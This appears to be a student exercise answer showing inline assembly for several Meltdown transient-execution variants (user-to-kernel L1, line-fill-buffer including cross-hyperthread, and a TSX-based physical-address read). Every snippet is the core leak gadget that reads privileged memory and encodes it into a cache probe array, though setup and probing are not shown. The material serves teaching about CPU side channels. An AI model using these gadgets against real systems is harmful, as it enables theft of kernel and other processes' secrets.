### Exercise 4
#### Meltdown-US-L1
``` c
if (setjmp(jmp_env) == 0) {
asm volatile(                       # rax free; rbx = array; rcx = direct_va
"movzx (%%rcx), %%rax\n"            # rax = 0; rax = (uint8_t)direct_va
"shl $12, %%rax\n"                  # rax = rax * PAGE_SIZE
"movq (%%rbx,%%rax,1), %%rbx\n"     # rbx = array[rax] = array[leak(direct_va) * PAGE_SIZE]
:: "c"(direct_va), "b"(array) : "rax");
}
```

#### Meltdown-US-LFB
``` c
if (setjmp(jmp_env) == 0) {
asm volatile(                       # rax free; rbx = array; rcx = ka; rdx = va
"clflush (%%rdx)\n"                 # flush(va) to force memory access
"mfence\n"                          # Ensure flush completes
"movzx (%%rdx), %%rax\n"            # Trigger victims LFB fill (user access)
"movzx (%%rcx), %%rax\n"            # rax = 0; rax = (uint8_t)ka 
                                    # (Access kernel address) -> LFB forwards to micro register once data available 
"shl $12, %%rax\n"                  # rax = rax * PAGE_SIZE
"movq (%%rbx,%%rax,1), %%rbx\n"     # rbx = array[rax] = array[leak(RANDOM) * PAGE_SIZE]
:: "d"(va), "c"(ka), "b"(array) : "rax");
}
```
```c
// Cross-hyperthread
if (setjmp(jmp_env) == 0) {
asm volatile(
"movzx (%%rcx), %%rax\n"            # Access kernel addr (faults)
                                     # LFB forwards recent victim data
"shl $12, %%rax\n"
"movq (%%rbx,%%rax,1), %%rbx\n"
:: "c"(ka), "b"(array) : "rax");
}
```

#### Meltdown-P-L1
``` c
// On vulnerable CPUs, can access physical addresses via special instructions
// or via kernel's direct physical mapping
if (setjmp(jmp_env) == 0) {
asm volatile(
"xbegin 1f\n"                       # Start TSX transaction (suppress faults)
"movzx (%%rcx), %%rax\n"            # Access physical addr via kernel mapping
"shl $12, %%rax\n"
"movq (%%rbx,%%rax,1), %%rbx\n"
"xend\n"                            # End transaction
"1:\n"
:: "c"(phys_addr_via_direct_map), "b"(array) : "rax");
}
```